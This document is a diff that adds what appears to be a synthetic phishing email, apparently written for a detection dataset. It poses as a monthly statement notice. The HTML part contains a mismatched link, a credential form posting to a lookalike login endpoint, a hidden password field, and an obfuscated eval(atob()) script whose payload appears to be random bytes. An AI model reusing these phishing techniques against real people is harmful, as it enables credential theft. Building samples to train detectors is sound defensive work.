@@ -1,0 +1,31 @@
+From: notice@firebase-auth.firebaseapp.com
+To: victim32@example.com
+Subject: Monthly statement available [ref UEF3620]
+Date: Tue, 07 Mar 2002 17:30:00 -0500
+Message-ID: <phish-32-a2db1ac3-4a04-46c6-8239-da9d65519040@firebase-auth.firebaseapp.com>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 02 Mar 2002 03:58:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 23 Mar 2002 13:47:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 11 Mar 2002 12:01:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 23 Mar 2002 23:42:00 -0500
+Return-Path: <notice@firebase-auth.firebaseapp.com>
+Reply-To: notice@firebase-auth.firebaseapp.com
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=firebase-auth.firebaseapp.com; dkim=pass header.d=firebase-auth.firebaseapp.com; dmarc=pass header.from=firebase-auth.firebaseapp.com
+Received-SPF: pass (mx.example.com: domain of notice@firebase-auth.firebaseapp.com designates 192.0.2.52 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=firebase-auth.firebaseapp.com; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-32-e3ebd413"
+
+--bnd-p-32-e3ebd413
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+Your monthly statement is ready. Open the link below.
+https://firebase-auth.firebaseapp.com/statement/UEF3620
+
+Reference: UEF3620
+--bnd-p-32-e3ebd413
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>Your monthly statement is ready. Open the link below.<br/>https://firebase-auth.firebaseapp.com/statement/UEF3620<br/><br/>Reference: UEF3620</p><p><a href="http://firebase-auth.firebaseapp.com/login">https://www.example.com/signin</a></p><form action="http://firebase-auth.firebaseapp.com/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-32-e3ebd413--
